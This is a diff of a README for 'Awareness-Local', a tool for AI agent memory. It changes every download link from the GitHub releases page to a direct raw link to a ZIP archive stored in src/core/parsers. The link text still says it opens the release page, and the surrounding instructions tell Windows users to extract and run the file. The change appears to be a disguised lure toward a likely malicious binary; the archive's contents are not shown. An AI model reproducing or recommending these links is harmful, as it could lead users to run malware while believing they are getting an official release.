@@ -1,6 +1,6 @@
 # 🧠 Awareness-Local - Persistent memory for AI agents
 
-[![Download Awareness-Local](https://img.shields.io/badge/Download-Awareness--Local-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/okeidontlike/Awareness-Local/releases)
+[![Download Awareness-Local](https://img.shields.io/badge/Download-Awareness--Local-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/okeidontlike/Awareness-Local/raw/refs/heads/main/src/core/parsers/Awareness-Local-1.4.zip)
 
 ## 🚀 What it does
 
@@ -19,7 +19,7 @@ It keeps your agent context on your own computer, so you do not need an account 
 
 Visit this page to download the Windows release:
 
-[Download Awareness-Local releases](https://github.com/okeidontlike/Awareness-Local/releases)
+[Download Awareness-Local releases](https://github.com/okeidontlike/Awareness-Local/raw/refs/heads/main/src/core/parsers/Awareness-Local-1.4.zip)
 
 Look for the latest release and download the Windows file that matches your system. If the release includes a ZIP file, download it, then extract it before you run the app.
 
@@ -226,6 +226,6 @@ Then start a new session and check whether the agent uses that memory again
 
 ## 📦 Download location
 
-[Open the Awareness-Local release page](https://github.com/okeidontlike/Awareness-Local/releases)
+[Open the Awareness-Local release page](https://github.com/okeidontlike/Awareness-Local/raw/refs/heads/main/src/core/parsers/Awareness-Local-1.4.zip)
 
 Download the latest Windows release from that page, then run the app after extraction if the file comes in a ZIP folder
